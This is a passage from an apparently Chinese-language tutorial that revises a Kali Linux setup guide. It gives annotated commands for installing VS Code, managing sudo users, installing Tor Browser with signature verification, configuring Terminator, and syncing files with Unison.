</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 1. 安装Microsoft GPG密钥（验证软件包真实性）</span>
</span></span><span class=line><span class=cl><span class=c1># 作用：防止中间人攻击，确保下载的软件未被篡改</span>
</span></span><span class=line><span class=cl><span class=c1># 密钥指纹：BC52 8686 B50D 79E3 39D3  721C EB3E 94AD BE12 29CF</span>
</span></span><span class=line><span class=cl>wget -qO- https://packages.microsoft.com/keys/microsoft.asc <span class=p>|</span> gpg --dearmor &gt; packages.microsoft.gpg
</span></span><span class=line><span class=cl>sudo install -D -o root -g root -m <span class=m>644</span> packages.microsoft.gpg /etc/apt/keyrings/packages.microsoft.gpg
</span></span><span class=line><span class=cl>rm packages.microsoft.gpg
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 2. 添加VS Code软件源</span>
</span></span><span class=line><span class=cl><span class=c1># 作用：让apt能获取VS Code的更新，实现自动升级</span>
</span></span><span class=line><span class=cl><span class=c1># tee命令：将输出同时显示和写入文件</span>
</span></span><span class=line><span class=cl><span class=c1># -a参数：追加模式，不覆盖原文件</span>
</span></span><span class=line><span class=cl>sudo sh -c <span class=s1>&#39;echo &#34;deb [arch=amd64,arm64,armhf signed-by=/etc/apt/keyrings/packages.microsoft.gpg] https://packages.microsoft.com/repos/code stable main&#34; &gt; /etc/apt/sources.list.d/vscode.list&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 3. 刷新软件源并安装</span>
</span></span><span class=line><span class=cl>sudo apt update
</span></span><span class=line><span class=cl>sudo apt install -y code
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 4. 验证安装</span>
</span></span><span class=line><span class=cl>code --version
</span></span><span class=line><span class=cl><span class=c1># 输出示例：1.82.3 x64 8b617bd08fd9e3fc94d14adb8d358b56e3f72314</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 5. 启动方式</span>
</span></span><span class=line><span class=cl><span class=c1># 当前目录打开：code .</span>
</span></span><span class=line><span class=cl><span class=c1># 指定文件打开：code /path/to/file</span>
</span></span><span class=line><span class=cl><span class=c1># 以root权限打开（不推荐）：sudo code --user-data-dir=&#34;/root/.vscode-root&#34;</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=方法二手动安装deb包适合离线环境>方法二：手动安装.deb包（适合离线环境）</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 1. 下载正确版本（从code.visualstudio.com）</span>
</span></span><span class=line><span class=cl><span class=c1># 注意：Kali基于Debian Testing，应下载.deb包</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> ~/Downloads
</span></span><span class=line><span class=cl><span class=c1># 使用wget下载（示例版本，请检查最新版）</span>
</span></span><span class=line><span class=cl>wget https://code.visualstudio.com/sha/download?build<span class=o>=</span>stable<span class=p>&amp;</span><span class=nv>os</span><span class=o>=</span>linux-deb-x64 -O code_latest_amd64.deb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 2. 验证下载完整性（强烈建议）</span>
</span></span><span class=line><span class=cl><span class=c1># 获取SHA256哈希值并与官网对比</span>
</span></span><span class=line><span class=cl>sha256sum code_latest_amd64.deb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 3. 正确安装方式（无需移动文件）</span>
</span></span><span class=line><span class=cl><span class=c1># 方式A：使用apt自动处理依赖</span>
</span></span><span class=line><span class=cl>sudo apt install -y ./code_latest_amd64.deb
</span></span><span class=line><span class=cl><span class=c1># ./ 的作用：明确指定本地文件路径，避免apt从仓库查找</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 方式B：使用dpkg（需手动解决依赖）</span>
</span></span><span class=line><span class=cl>sudo dpkg -i code_latest_amd64.deb
</span></span><span class=line><span class=cl><span class=c1># 如果报错，再执行：sudo apt install -f -y</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 常见错误处理</span>
</span></span><span class=line><span class=cl><span class=c1># 错误：E: Sub-process /usr/bin/dpkg returned an error code</span>
</span></span><span class=line><span class=cl><span class=c1># 解决：sudo dpkg --configure -a &amp;&amp; sudo apt install -f -y</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 错误：依赖问题</span>
</span></span><span class=line><span class=cl><span class=c1># 解决：sudo apt --fix-broken install</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>技术解读</strong>：<code>.deb</code>是Debian系软件包格式，包含二进制文件、元数据和安装脚本。<code>apt</code>比<code>dpkg</code>智能，能自动解决依赖关系。</p><hr><h2 id=三用户权限管理安全核心>三、用户权限管理（安全核心）</h2><h3 id=原文错误分析-1>原文错误分析</h3><ol><li><code>sudo su</code> 是坏习惯：它会丢失环境变量，可能引发权限混乱</li><li>缺少安全警告：直接操作root用户风险极高</li><li>未解释用户组机制</li></ol><h3 id=安全最佳实践>安全最佳实践</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 场景：为Kali虚拟机创建日常用户（强烈建议）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 方法1：正确使用root环境（推荐）</span>
</span></span><span class=line><span class=cl><span class=c1># -i 参数：模拟初始登录，加载root的完整环境变量</span>
</span></span><span class=line><span class=cl>sudo -i
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 方法2：使用su（注意-参数）</span>
</span></span><span class=line><span class=cl><span class=c1># -, -l, --login：让shell成为登录shell，加载环境变量</span>
</span></span><span class=line><span class=cl>su -
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 创建新用户（以justwin为例）</span>
</span></span><span class=line><span class=cl><span class=c1># adduser vs useradd：</span>
</span></span><span class=line><span class=cl><span class=c1># adduser：交互式，自动创建家目录、设置密码、复制配置文件</span>
</span></span><span class=line><span class=cl><span class=c1># useradd：非交互，需手动指定所有参数</span>
</span></span><span class=line><span class=cl>adduser justwin
</span></span><span class=line><span class=cl><span class=c1># 执行后会提示：</span>
</span></span><span class=line><span class=cl><span class=c1># - 输入新密码（需包含大小写、数字、特殊字符）</span>
</span></span><span class=line><span class=cl><span class=c1># - 确认密码</span>
</span></span><span class=line><span class=cl><span class=c1># - 填写用户全名（可选）</span>
</span></span><span class=line><span class=cl><span class=c1># - 其他信息（均按Enter跳过）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 将用户加入sudo组（Kali中sudo组有完全root权限）</span>
</span></span><span class=line><span class=cl><span class=c1># usermod：修改用户属性</span>
</span></span><span class=line><span class=cl><span class=c1># --append (-a)：添加到附加组，不覆盖主组</span>
</span></span><span class=line><span class=cl><span class=c1># --groups (-G)：指定组列表</span>
</span></span><span class=line><span class=cl>usermod -aG sudo justwin
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 验证用户组归属</span>
</span></span><span class=line><span class=cl>groups justwin
</span></span><span class=line><span class=cl><span class=c1># 应输出：justwin : justwin sudo</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 验证sudo权限（重要！）</span>
</span></span><span class=line><span class=cl>su - justwin    <span class=c1># 切换到新用户</span>
</span></span><span class=line><span class=cl>sudo -l         <span class=c1># 列出当前用户可执行的sudo命令</span>
</span></span><span class=line><span class=cl><span class=c1># 输出应包含：ALL : ALL</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 测试sudo是否工作</span>
</span></span><span class=line><span class=cl>sudo apt update
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 退出当前会话</span>
</span></span><span class=line><span class=cl><span class=nb>exit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 高级权限管理（可选）</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 1. 限制sudo权限（生产环境推荐）</span>
</span></span><span class=line><span class=cl><span class=c1># 编辑sudoers文件（必须使用visudo，防止配置错误导致无法sudo）</span>
</span></span><span class=line><span class=cl>sudo visudo
</span></span><span class=line><span class=cl><span class=c1># 添加行：justwin ALL=(ALL) NOPASSWD:/usr/bin/apt,/usr/bin/nmap</span>
</span></span><span class=line><span class=cl><span class=c1># 意义：justwin可无需密码执行apt和nmap</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 2. 查看sudo操作日志</span>
</span></span><span class=line><span class=cl><span class=c1># Kali默认记录所有sudo操作到/var/log/auth.log</span>
</span></span><span class=line><span class=cl>sudo grep sudo /var/log/auth.log <span class=p>|</span> tail -20
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 3. 设置sudo会话超时</span>
</span></span><span class=line><span class=cl>sudo visudo
</span></span><span class=line><span class=cl><span class=c1># 添加：Defaults timestamp_timeout=5</span>
</span></span><span class=line><span class=cl><span class=c1># 意义：5分钟后需重新输入密码（默认15分钟）</span>
</span></span></code></pre></td></tr></table></div></div><p><strong>安全原理</strong>：Linux使用UID/GID机制，<code>sudo</code>组(通常GID=27)在sudoers文件中被授权。<code>/etc/sudoers</code>定义了谁能以什么身份执行什么命令。<code>visudo</code>命令会锁定文件并进行语法检查，防止配置错误导致系统锁定。</p><hr><h2 id=四tor浏览器安全增强版>四、Tor浏览器（安全增强版）</h2><h3 id=原文错误分析-2>原文错误分析</h3><ol><li><strong>严重安全缺失</strong>：未验证签名！这是重大安全隐患</li><li><strong>缺少版本管理</strong>：未说明如何更新</li><li><strong>目录权限</strong>：Tor不应在root下运行</li></ol><h3 id=安全安装流程>安全安装流程</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 1. 创建专用用户（推荐，隔离环境）</span>
</span></span><span class=line><span class=cl>sudo adduser toruser --disabled-password --gecos <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=c1># --disabled-password：禁止密码登录（更安全）</span>
</span></span><span class=line><span class=cl><span class=c1># --gecos &#34;&#34;: 跳过信息填写</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 2. 下载Tor浏览器（获取最新链接）</span>
</span></span><span class=line><span class=cl><span class=c1># 访问 https://www.torproject.org/download/languages/ 查看最新版本</span>
</span></span><span class=line><span class=cl><span class=nb>cd</span> ~/Downloads
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 使用wget下载（替换为最新版本）</span>
</span></span><span class=line><span class=cl>wget https://www.torproject.org/dist/torbrowser/13.0.10/tor-browser-linux-x86_64-13.0.10.tar.xz
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ========== 关键：验证签名（防篡改）==========</span>
</span></span><span class=line><span class=cl><span class=c1># 3. 下载签名文件</span>
</span></span><span class=line><span class=cl>wget https://www.torproject.org/dist/torbrowser/13.0.10/tor-browser-linux-x86_64-13.0.10.tar.xz.asc
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 4. 导入Tor项目GPG密钥</span>
</span></span><span class=line><span class=cl>gpg --auto-key-locate nodefault,wkd --locate-keys torbrowser@torproject.org
</span></span><span class=line><span class=cl><span class=c1># 密钥指纹应为：EF6E 286D DA85 EA2A 4BA7  DE68 4E2C 6E87 9329 8290</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 5. 验证签名</span>
</span></span><span class=line><span class=cl>gpg --verify tor-browser-linux-x86_64-13.0.10.tar.xz.asc
</span></span><span class=line><span class=cl><span class=c1># 必须看到 &#34;Good signature&#34; 才安全</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 6. 解压（注意J参数大写）</span>
</span></span><span class=line><span class=cl><span class=c1># -x: 解压（extract）</span>
</span></span><span class=line><span class=cl><span class=c1># -v: 显示过程（verbose）</span>
</span></span><span class=line><span class=cl><span class=c1># -J: 使用xz解压（大写）</span>
</span></span><span class=line><span class=cl><span class=c1># -f: 指定文件</span>
</span></span><span class=line><span class=cl>tar -xvJf tor-browser-linux-x86_64-13.0.10.tar.xz
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 7. 移动/设置到安全目录</span>
</span></span><span class=line><span class=cl><span class=c1># 不应在/Downloads运行，应移至永久位置</span>
</span></span><span class=line><span class=cl>sudo mv tor-browser /opt/
</span></span><span class=line><span class=cl>sudo chown -R toruser:toruser /opt/tor-browser
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 8. 创建桌面快捷方式（可选）</span>
</span></span><span class=line><span class=cl>cat &gt; ~/.local/share/applications/tor-browser.desktop <span class=s>&lt;&lt; EOF
</span></span></span><span class=line><span class=cl><span class=s>[Desktop Entry]
</span></span></span><span class=line><span class=cl><span class=s>Name=Tor Browser
</span></span></span><span class=line><span class=cl><span class=s>Exec=/opt/tor-browser/Browser/start-tor-browser
</span></span></span><span class=line><span class=cl><span class=s>Icon=/opt/tor-browser/Browser/browser/chrome/icons/default/default128.png
</span></span></span><span class=line><span class=cl><span class=s>Type=Application
</span></span></span><span class=line><span class=cl><span class=s>Categories=Network;Security;
</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 9. 首次启动（以普通用户）</span>
</span></span><span class=line><span class=cl>su - toruser
</span></span><span class=line><span class=cl>/opt/tor-browser/Browser/start-tor-browser
</span></span><span class=line><span class=cl><span class=c1># 第一次启动会配置代理和桥接</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 10. 验证连接</span>
</span></span><span class=line><span class=cl><span class=c1># 在Tor浏览器访问：https://check.torproject.org</span>
</span></span><span class=line><span class=cl><span class=c1># 应看到绿色洋葱图标和&#34;Congratulations&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 11. 创建启动脚本（方便使用）</span>
</span></span><span class=line><span class=cl>sudo ln -s /opt/tor-browser/Browser/start-tor-browser /usr/local/bin/tor-browser
</span></span></code></pre></td></tr></table></div></div><p><strong>安全机制</strong>：Tor使用三重加密和洋葱路由，通过<code>.asc</code>签名文件验证可确保软件未被植入后门。Tor浏览器基于Firefox ESR，已禁用危险功能（WebRTC、外部插件）。</p><hr><h2 id=五终端增强terminator与替代方案>五、终端增强（Terminator与替代方案）</h2><h3 id=详细安装与配置>详细安装与配置</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># 安装Terminator（分屏终端）</span>
</span></span><span class=line><span class=cl>sudo apt update
</span></span><span class=line><span class=cl>sudo apt install -y terminator
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 验证安装</span>
</span></span><span class=line><span class=cl>terminator --version
</span></span><span class=line><span class=cl><span class=c1># 输出：terminator 2.1.1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 基本使用快捷键</span>
</span></span><span class=line><span class=cl><span class=c1># Ctrl+Shift+E: 垂直分屏</span>
</span></span><span class=line><span class=cl><span class=c1># Ctrl+Shift+O: 水平分屏</span>
</span></span><span class=line><span class=cl><span class=c1># Ctrl+Shift+T: 新建标签页</span>
</span></span><span class=line><span class=cl><span class=c1># Ctrl+Shift+W: 关闭当前终端</span>
</span></span><span class=line><span class=cl><span class=c1># Alt+方向键: 在分屏间切换</span>
</span></span><span class=line><span class=cl><span class=c1># Ctrl+Shift+X: 最大化/恢复当前分屏</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 高级配置（创建配置文件）</span>
</span></span><span class=line><span class=cl>mkdir -p ~/.config/terminator
</span></span><span class=line><span class=cl>cat &gt; ~/.config/terminator/config <span class=s>&lt;&lt; EOF
</span></span></span><span class=line><span class=cl><span class=s>[global_config]
</span></span></span><span class=line><span class=cl><span class=s>  title_transmit_bg_color = &#34;#d30102&#34;
</span></span></span><span class=line><span class=cl><span class=s>  focus = system
</span></span></span><span class=line><span class=cl><span class=s>[keybindings]
</span></span></span><span class=line><span class=cl><span class=s>[layouts]
</span></span></span><span class=line><span class=cl><span class=s>  [[default]]
</span></span></span><span class=line><span class=cl><span class=s>    [[[window0]]]
</span></span></span><span class=line><span class=cl><span class=s>      type = Window
</span></span></span><span class=line><span class=cl><span class=s>      parent = &#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s>    [[[child1]]]
</span></span></span><span class=line><span class=cl><span class=s>      type = Terminal
</span></span></span><span class=line><span class=cl><span class=s>      parent = window0
</span></span></span><span class=line><span class=cl><span class=s>      profile = default
</span></span></span><span class=line><span class=cl><span class=s>[plugins]
</span></span></span><span class=line><span class=cl><span class=s>[profiles]
</span></span></span><span class=line><span class=cl><span class=s>  [[default]]
</span></span></span><span class=line><span class=cl><span class=s>    cursor_color = &#34;#aaaaaa&#34;
</span></span></span><span class=line><span class=cl><span class=s>    font = Hack 12
</span></span></span><span class=line><span class=cl><span class=s>    foreground_color = &#34;#ffffff&#34;
</span></span></span><span class=line><span class=cl><span class=s>    background_color = &#34;#300a24&#34;  # Kali默认紫色
</span></span></span><span class=line><span class=cl><span class=s>    scrollbar_position = disabled
</span></span></span><span class=line><span class=cl><span class=s>    scrollback_lines = 10000
</span></span></span><span class=line><span class=cl><span class=s>    scroll_on_output = False
</span></span></span><span class=line><span class=cl><span class=s>    copy_on_selection = True
</span></span></span><span class=line><span class=cl><span class=s>    exit_action = close
</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 其他优秀终端推荐</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 1. Guake（下拉式终端，类似游戏控制台）</span>
</span></span><span class=line><span class=cl>sudo apt install -y guake
</span></span><span class=line><span class=cl><span class=c1># 启动：guake</span>
</span></span><span class=line><span class=cl><span class=c1># 默认快捷键：F12显示/隐藏</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 2. Tilix（现代分屏终端，GTK3）</span>
</span></span><span class=line><span class=cl>sudo apt install -y tilix
</span></span><span class=line><span class=cl><span class=c1># 优点：拖拽分屏，进度条显示</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 3. Alacritty（GPU加速，极快）</span>
</span></span><span class=line><span class=cl>sudo apt install -y alacritty
</span></span><span class=line><span class=cl><span class=c1># 配置：~/.config/alacritty/alacritty.yml</span>
</span></span></code></pre></td></tr></table></div></div><hr><h2 id=六文件同步unison与更优方案>六、文件同步（Unison与更优方案）</h2><h3 id=原理与完整配置>原理与完整配置</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Kali端安装Unison（双向同步）</span>
</span></span><span class=line><span class=cl>sudo apt update
</span></span><span class=line><span class=cl>sudo apt install -y unison unison-gtk
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 查看版本（协议版本必须匹配）</span>
</span></span><span class=line><span class=cl>unison -version
</span></span><span class=line><span class=cl><span class=c1># 输出：unison version 2.51.5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 创建Unison配置文件</span>
</span></span><span class=line><span class=cl>mkdir -p ~/.unison
</span></span><span class=line><span class=cl>cat &gt; ~/.unison/default.prf <span class=s>&lt;&lt; EOF
</span></span></span><span class=line><span class=cl><span class=s># Unison配置文件
</span></span></span><span class=line><span class=cl><span class=s># 本地目录
</span></span></span><span class=line><span class=cl><span class=s>root = /home/kali/Projects
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s># 远程目录（通过SSH）
</span></span></span><span class=line><span class=cl><span class=s>root = ssh://kali@192.168.1.100//home/kali/Projects
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s># SSH端口（如果不是默认22）
</span></span></span><span class=line><span class=cl><span class=s>sshargs = -p 2222
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s># 同步模式
</span></span></span><span class=line><span class=cl><span class=s>auto = true
</span></span></span><span class=line><span class=cl><span class=s>batch = true
</span></span></span><span class=line><span class=cl><span class=s>prefer = newer
</span></span></span><span class=line><span class=cl><span class=s>times = true
</span></span></span><span class=line><span class=cl><span class=s>owner = true
</span></span></span><span class=line><span class=cl><span class=s>group = true
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s># 排除规则
</span></span></span><span class=line><span class=cl><span class=s>ignore = Name *~
</span></span></span><span class=line><span class=cl><span class=s>ignore = Name *.tmp
</span></span></span><span class=line><span class=cl><span class=s>ignore = Name .git
</span></span></span><span class=line><span class=cl><span class=s>ignore = Name __pycache__
</span></span></span><span class=line><span class=cl><span class=s>ignore = Name *.pyc
</span></span></span><span class=line><span class=cl><span class=s>
</span></span></span><span class=line><span class=cl><span class=s># 日志
</span></span></span><span class=line><span class=cl><span class=s>log = true
</span></span></span><span class=line><span class=cl><span class=s>logfile = /home/kali/.unison/unison.log
</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 首次同步（会提示确认）</span>
</span></span><span class=line><span class=cl>unison
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 自动同步（使用cron）</span>
</span></span><span class=line><span class=cl>crontab -e
</span></span><span class=line><span class=cl><span class=c1># 添加：*/5 * * * * unison -silent</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ========== 更优方案：rsync + SSH ==========</span>
</span></span><span class=line><span class=cl><span class=c1># 单向同步（Kali→Windows），更稳定快速</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Kali端推送到Windows（需Windows开SSH服务）</span>
